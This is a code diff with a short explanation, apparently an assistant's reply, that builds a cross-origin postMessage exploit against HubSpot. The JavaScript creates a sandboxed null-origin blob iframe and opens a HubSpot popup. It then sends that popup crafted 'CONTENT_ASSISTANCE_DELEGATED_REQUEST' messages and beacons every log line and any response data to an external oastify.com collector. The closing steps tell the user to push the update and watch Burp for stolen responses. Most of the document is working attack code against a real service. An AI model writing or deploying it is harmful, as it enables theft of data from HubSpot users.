@@ -16,45 +16,150 @@ window.addEventListener('message', function(e) {
     if (e.data && e.data.action === 'startExploit') {
         log('TRIGGERED');
         
-        // Create a blob URL with null origin
         const blob = new Blob([`
+<html>
+<body>
+<h2>Sandbox with Null Origin</h2>
+<div id="log" style="font-family:monospace;font-size:11px;background:#000;color:#0f0;padding:10px;"></div>
 <script>
 const E = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
-function l(m) { new Image().src = E + '/?s=' + encodeURIComponent(m); }
-l('START_origin=' + window.origin);
-let h = window.open('https://app-eu1.hubspot.com', 'h', 'width=800,height=600');
-if(h) {
-    l('opened');
-    let a = 0;
-    setInterval(() => {
-        try { h.origin; } 
-        catch(e) {
-            if(a++ === 0) {
-                l('loaded');
-                setTimeout(() => {
-                    h.postMessage({type:'CONTENT_ASSISTANCE_DELEGATED_REQUEST',commandId:'x',featureId:'x',parameters:{},resultCount:1,language:'en',objectId:'46962361',applicationId:'x',basePath:'/',maxPollingAttempts:1,pollingInterval:100}, '*');
-                    l('sent');
-                }, 1000);
+
+function l(m) { 
+    document.getElementById('log').innerHTML += '<br>' + m;
+    new Image().src = E + '/?s=' + encodeURIComponent(m); 
+}
+
+l('sandbox_started');
+l('origin=' + window.origin);
+
+// Listen for responses
+window.addEventListener('message', function(r) {
+    l('GOT_RESPONSE_from=' + r.origin);
+    l('response_type=' + (r.data.type || 'unknown'));
+    new Image().src = E + '/?RESPONSE=' + encodeURIComponent(JSON.stringify(r.data).substring(0, 400));
+});
+
+l('opening_hubspot');
+
+try {
+    let h = window.open('https://app-eu1.hubspot.com', 'hub', 'width=900,height=700');
+    
+    if (!h) {
+        l('ERROR_popup_blocked');
+    } else {
+        l('popup_opened');
+        l('popup_closed=' + h.closed);
+        
+        let attempts = 0;
+        let loaded = false;
+        
+        let checker = setInterval(() => {
+            attempts++;
+            
+            try {
+                // Try to access origin - will throw when cross-origin
+                let test = h.origin;
+                
+                if (attempts % 10 === 0) {
+                    l('still_same_origin_attempt=' + attempts);
+                }
+            } catch(e) {
+                if (!loaded) {
+                    loaded = true;
+                    clearInterval(checker);
+                    
+                    l('hubspot_loaded_after=' + attempts + '_attempts');
+                    l('error_msg=' + e.message.substring(0, 50));
+                    l('popup_still_open=' + !h.closed);
+                    
+                    // Wait for HubSpot to fully initialize
+                    setTimeout(() => {
+                        l('sending_exploit_1');
+                        
+                        h.postMessage({
+                            type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
+                            commandId: 'exploit',
+                            featureId: 'test',
+                            parameters: {},
+                            resultCount: 1,
+                            language: 'en',
+                            objectId: '46962361',
+                            applicationId: 'crm',
+                            basePath: '/',
+                            maxPollingAttempts: 5,
+                            pollingInterval: 1000
+                        }, '*');
+                        
+                        l('exploit_1_sent');
+                        
+                        // Try a simpler message too
+                        setTimeout(() => {
+                            l('sending_exploit_2');
+                            h.postMessage({test: 'hello'}, '*');
+                            l('exploit_2_sent');
+                        }, 1000);
+                        
+                    }, 2000);
+                }
             }
-        }
-    }, 100);
+            
+            if (attempts > 150) {
+                clearInterval(checker);
+                l('timeout_after_150_attempts');
+            }
+        }, 100);
+    }
+} catch(err) {
+    l('CRITICAL_ERROR=' + err.message);
 }
 <\/script>
+</body>
+</html>
         `], {type: 'text/html'});
         
         const blobUrl = URL.createObjectURL(blob);
+        log('blob_created=' + blobUrl.substring(0, 50));
         
         const iframe = document.createElement('iframe');
         iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox';
         iframe.src = blobUrl;
         iframe.style.cssText = 'width:100%;height:400px;border:3px solid red';
-        document.body.appendChild(iframe);
         
-        log('BLOB_IFRAME_ADDED');
+        document.body.appendChild(iframe);
+        log('iframe_added');
     }
 });
 
-if(window.opener) window.opener.postMessage({status:'ready'},'*');
+if(window.opener) {
+    window.opener.postMessage({status:'ready'},'*');
+}
 </script>
 </body>
 </html>
+```
+
+---
+
+## **This version logs:**
+
+1. ✅ `origin=null` (confirmed working)
+2. Opening HubSpot popup
+3. Whether popup was blocked
+4. Polling attempts to detect when HubSpot loads
+5. **Two different exploit messages** (one complex, one simple)
+6. Any responses received
+
+---
+
+## **Push this update and check Burp for:**
+```
+/?s=sandbox_started
+/?s=origin=null
+/?s=opening_hubspot
+/?s=popup_opened
+/?s=hubspot_loaded_after=XX_attempts
+/?s=sending_exploit_1
+/?s=exploit_1_sent
+/?s=sending_exploit_2
+/?s=exploit_2_sent
+/?RESPONSE=...          ← THE GOAL!
